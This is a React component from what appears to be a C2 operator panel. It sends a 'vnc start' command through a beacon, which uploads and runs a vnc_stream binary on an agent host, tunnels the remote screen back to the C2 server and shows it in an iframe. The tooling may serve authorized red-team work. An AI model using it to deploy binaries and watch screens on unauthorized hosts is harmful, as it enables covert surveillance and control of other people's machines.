import { useEffect, useMemo, useRef, useState } from 'react'
import { useStore } from '../store'
import { isAgentOnline } from '../utils'
import { vncViewerUrl } from '../api/channel'

type VncSession = {
  id: string
  agent_id: string
  target_port: number
  local_port: number
  status: string
  quality?: number
  tunnel_id?: string
}

export function VncPanel({ agentId }: { agentId: string }) {
  const api = useStore((s) => s.api)
  const agents = useStore((s) => s.agents) || {}
  const closeUiTab = useStore((s) => s.closeUiTab)
  const pushToast = useStore((s) => s.pushToast)
  const pushLog = useStore((s) => s.pushLog)
  const acquireInteractBoost = useStore((s) => s.acquireInteractBoost)
  const agent = agents[agentId]
  const live = !!(agent && isAgentOnline(agent))

  const [targetPort, setTargetPort] = useState(40484)
  const [localPort, setLocalPort] = useState(41484)
  const [session, setSession] = useState<VncSession | null>(null)
  const [sessions, setSessions] = useState<VncSession[]>([])
  const [busy, setBusy] = useState(false)
  const [phase, setPhase] = useState('')
  const [err, setErr] = useState('')
  const [hint, setHint] = useState('一键启动：上传 vnc_stream → 建立隧道 → 打开画面。需主机在线。')
  const iframeRef = useRef<HTMLIFrameElement>(null)
  const seq = useRef(0)

  const viewer = useMemo(() => {
    if (!session) return ''
    // Prefer session id when present; otherwise local port (after vnc start tunnel)
    if (session.id) return vncViewerUrl(session.id, session.local_port)
    return vncViewerUrl('', session.local_port)
  }, [session])

  async function listSessions() {
    try {
      const res = await api.get<any>('/api/vnc/api/sessions')
      const arr = res?.sessions || res?.data || []
      if (Array.isArray(arr)) {
        const mine = arr.filter((s: any) => s.agent_id === agentId)
        setSessions(mine)
      }
    } catch {
      // service missing
    }
  }

  useEffect(() => {
    acquireInteractBoost(agentId).catch(() => {})
    listSessions()
    const t = window.setInterval(listSessions, 10000)
    return () => clearInterval(t)
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [agentId])

  async function quietExec(cmdline: string, args: Record<string, any>) {
    try {
      await api.commandExecute(agentId, cmdline, args, false)
    } catch {
      await api.commandRaw(agentId, cmdline)
    }
  }

  /** Full start: deploy agent stream + tunnel via beacon, then open viewer by local port. */
  async function startAll() {
    if (!live) {
      pushToast('warn', '主机离线，无法启动 VNC')
      return
    }
    if (!api) {
      pushToast('err', '未连接 API')
      return
    }
    const my = ++seq.current
    setBusy(true)
    setErr('')
    setPhase('加速心跳…')
    try {
      await acquireInteractBoost(agentId)
      if (my !== seq.current) return

      // Clean previous session/tunnel on same local port if any
      if (session?.id) {
        setPhase('停止旧会话…')
        try { await api.post('/api/vnc/api/session/stop', { session_id: session.id }) } catch { /* */ }
        setSession(null)
      }
      setPhase('清理旧隧道…')
      try {
        await quietExec(`vnc stop ${localPort}`, {
          command: 'vnc',
          subcommand: 'stop',
          local_port: Number(localPort),
        })
      } catch { /* ignore if none */ }

      // Deploy stream binary + create tunnel on agent/C2 (beacon "vnc start")
      setPhase('下发 vnc start（上传流服务 + 隧道）…')
      await quietExec(`vnc start ${targetPort} ${localPort}`, {
        command: 'vnc',
        subcommand: 'start',
        target_port: Number(targetPort),
        local_port: Number(localPort),
      })
      if (my !== seq.current) return

      // Wait for beacon to upload/run vnc_stream (sleep 0 still needs a check-in or two)
      setPhase('等待 agent 启动 vnc_stream（约 6s）…')
      await new Promise((r) => setTimeout(r, 6000))
      if (my !== seq.current) return

      // Do NOT call session/start after vnc start — tunnel already owns localPort.
      // Viewer can use ?local=<port> (auto=1) without plugin session id.
      const sess: VncSession = {
        id: '',
        agent_id: agentId,
        target_port: targetPort,
        local_port: localPort,
        status: 'active',
      }

      setSession(sess)
      setHint('画面应自动连接。若仍黑屏，再等几秒后点「重连画面」。')
      setPhase('')
      pushToast('ok', 'VNC 已启动')
      pushLog('ok', `VNC start agent=${agentId} local=${localPort}->${targetPort}`, false)
      await listSessions()
    } catch (e: any) {
      if (my !== seq.current) return
      const msg = e?.message || String(e)
      setErr(msg)
      setPhase('')
      pushToast('err', msg)
    } finally {
      if (my === seq.current) setBusy(false)
    }
  }

  async function stopAll() {
    setBusy(true)
    setErr('')
    try {
      if (session?.id) {
        try { await api.post('/api/vnc/api/session/stop', { session_id: session.id }) } catch { /* */ }
      }
      try {
        await quietExec(`vnc stop ${session?.local_port || localPort}`, {
          command: 'vnc',
          subcommand: 'stop',
          local_port: Number(session?.local_port || localPort),
        })
      } catch { /* */ }
      setSession(null)
      setHint('已停止。可再次一键启动。')
      pushToast('info', 'VNC 已停止')
      await listSessions()
    } catch (e: any) {
      pushToast('err', e?.message || String(e))
    } finally {
      setBusy(false)
    }
  }

  function reloadViewer() {
    const el = iframeRef.current
    if (!el || !viewer) return
    // force reload auto-connect
    el.src = viewer + (viewer.includes('?') ? '&' : '?') + 'r=' + Date.now()
  }

  return (
    <div className="vnc-page">
      <div className="toolbar">
        <strong>VNC</strong>
        <span className="mono dim">{agent?.a_computer || agentId}</span>
        <span className={`tag ${live ? 'online' : 'offline'}`}>{live ? '在线' : '离线'}</span>
        {session && <span className="tag listen">{session.status || 'active'}</span>}
        <div className="sep" />
        <label className="muted">Agent 端口</label>
        <input
          type="number"
          style={{ width: 90 }}
          value={targetPort}
          disabled={!!session || busy}
          onChange={(e) => {
            const n = Number(e.target.value)
            setTargetPort(n)
            setLocalPort(n + 1000)
          }}
        />
        <label className="muted">C2 本地</label>
        <input
          type="number"
          style={{ width: 90 }}
          value={localPort}
          disabled={!!session || busy}
          onChange={(e) => setLocalPort(Number(e.target.value))}
        />
        {!session ? (
          <button className="primary" disabled={!live || busy} onClick={startAll}>
            {busy ? (phase || '启动中…') : '一键启动'}
          </button>
        ) : (
          <>
            <button className="danger" disabled={busy} onClick={stopAll}>停止</button>
            <button disabled={busy} onClick={reloadViewer}>重连画面</button>
          </>
        )}
        <button className="ghost" disabled={busy} onClick={listSessions}>刷新</button>
        {viewer && (
          <a className="buttonish" href={viewer} target="_blank" rel="noreferrer">新窗口</a>
        )}
        <button className="ghost" onClick={() => closeUiTab(`vnc:${agentId}` as any)}>关闭</button>
      </div>
      {err && <div className="banner warn">{err}</div>}
      {busy && phase && <div className="banner warn">{phase}</div>}
      {!session ? (
        <div className="vnc-empty">
          <div className="big">⧉</div>
          <div>尚未启动 VNC</div>
          <div className="dim" style={{ marginTop: 8, maxWidth: 560, textAlign: 'center', lineHeight: 1.5 }}>{hint}</div>
          <div className="dim" style={{ marginTop: 10, maxWidth: 560, textAlign: 'center', lineHeight: 1.5 }}>
            正确顺序：先在 agent 启动 vnc_stream，再拉流。点「一键启动」会自动完成部署与打开。
          </div>
          {sessions.length > 0 && (
            <div style={{ marginTop: 16, width: 'min(520px, 90%)' }}>
              <div className="dim" style={{ marginBottom: 6 }}>插件侧会话</div>
              {sessions.map((s) => (
                <div key={s.id} className="panel-row" style={{ justifyContent: 'space-between', display: 'flex', gap: 8, padding: '8px 0' }}>
                  <span className="mono">{s.id}</span>
                  <span className="dim">{s.status} · {s.local_port}→{s.target_port}</span>
                  <span style={{ display: 'flex', gap: 6 }}>
                    <button className="ghost" onClick={() => setSession(s)}>打开</button>
                    <button className="danger" onClick={async () => {
                      try { await api.post('/api/vnc/api/session/stop', { session_id: s.id }) } catch { /* */ }
                      if (session?.id === s.id) setSession(null)
                      listSessions()
                    }}>停</button>
                  </span>
                </div>
              ))}
            </div>
          )}
        </div>
      ) : (
        <iframe
          ref={iframeRef}
          className="vnc-frame"
          title={`vnc-${session.id || session.local_port}`}
          src={viewer}
        />
      )}
    </div>
  )
}
